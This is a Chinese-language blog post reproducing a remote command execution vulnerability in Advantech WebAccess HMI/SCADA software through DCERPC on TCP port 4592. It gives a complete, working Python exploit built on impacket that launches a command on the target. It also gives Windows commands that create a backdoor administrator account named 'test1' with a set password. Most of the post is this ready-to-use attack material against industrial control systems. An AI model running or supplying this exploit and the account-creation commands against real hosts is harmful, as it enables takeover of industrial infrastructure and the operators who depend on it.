# WebAccess远程命令执行漏洞复现 - secshell
LocalConst.POST_MATHJAX = ""

某地 2020 年工业互联网大赛中在外网区和控制区之间部署 mes 系统，上面安装 WebAccess 程序，现场复现成功。

## 漏洞说明

研华 WebAccess 是全世界第一套全浏览器架构的 HMI/SCADA 组态软件，可以无缝整合研华工业自动化事业群的产品，主要分为智能基础建设与智能制造两大类，这两类产品也同时组成了研华在智能自动化的物联网架构，而研华 WebAccess 正是这个物联网架构的核心。

此漏洞允许攻击者使用 RPC 协议通过 TCP 端口 4592 执行远程命令。

通过利用恶意分布式计算环境 / 远程过程调用（DCERPC），webvrpcs.exe 服务将命令行指令传递给主机， webvrpcs.exe 服务以管理员访问权限运行。版本小于 8.3、8.3.1、8.3.2 仍然存在特定的安全漏洞。

## 漏洞复现

`python exp.py ip`

复现成功截图

\[![](https://secpentest.oss-accelerate.aliyuncs.com/imgs/20201031002546.png)

]([https://secpentest.oss-accelerate.aliyuncs.com/imgs/20201031002546.png](https://secpentest.oss-accelerate.aliyuncs.com/imgs/20201031002546.png))

添加用户

```


`cmd.exe /c net user test1 P3ssw0rd /add
cmd.exe /c net localgroup administrators test1 /add

`
```

截图

\[![](https://secpentest.oss-accelerate.aliyuncs.com/imgs/20201031002815.png)

]([https://secpentest.oss-accelerate.aliyuncs.com/imgs/20201031002815.png](https://secpentest.oss-accelerate.aliyuncs.com/imgs/20201031002815.png))

exp

```


`#!/usr/bin/python2.7

import sys, struct
from impacket import uuid
from impacket.dcerpc.v5 import transport

def call(dce, opcode, stubdata):
  dce.call(opcode, stubdata)
  res = -1
  try:
    res = dce.recv()
  except Exception, e:
    print "Exception encountered..." + str(e)
    sys.exit(1)
  return res

if len(sys.argv) != 2:
  print "Provide only host arg"
  sys.exit(1)

port = 4592
interface = "5d2b62aa-ee0a-4a95-91ae-b064fdb471fc"
version = "1.0" 

host = sys.argv[1]

string_binding = "ncacn_ip_tcp:%s" % host
trans = transport.DCERPCTransportFactory(string_binding)
trans.set_dport(port)

dce = trans.get_dce_rpc()
dce.connect()

print "Binding..."
iid = uuid.uuidtup_to_bin((interface, version))
dce.bind(iid)

print "...1"
stubdata = struct.pack("<III", 0x00, 0xc351, 0x04)
call(dce, 2, stubdata)

print "...2"
stubdata = struct.pack("<I", 0x02)
res = call(dce, 4, stubdata)
if res == -1:
  print "Something went wrong"
  sys.exit(1)
res = struct.unpack("III", res)

if (len(res) < 3):
  print "Received unexpected length value"
  sys.exit(1)

print "...3"
# ioctl 0x2711
stubdata = struct.pack("<IIII", res[2], 0x2711, 0x204, 0x204)
command = "..\\..\\windows\\system32\\calc.exe"
fmt = "<" + str(0x204) + "s"
stubdata += struct.pack(fmt, command)
call(dce, 1, stubdata)

print "\nDid it work?"

dce.disconnect()

`
```

本文参考[https://www.secshi.com/30934.html](https://www.secshi.com/30934.html)

最后修改：2021 年 02 月 20 日 02 : 16 AM

© 允许规范转载 
 [https://secshell.cn/index.php/vuln/52.html](https://secshell.cn/index.php/vuln/52.html)
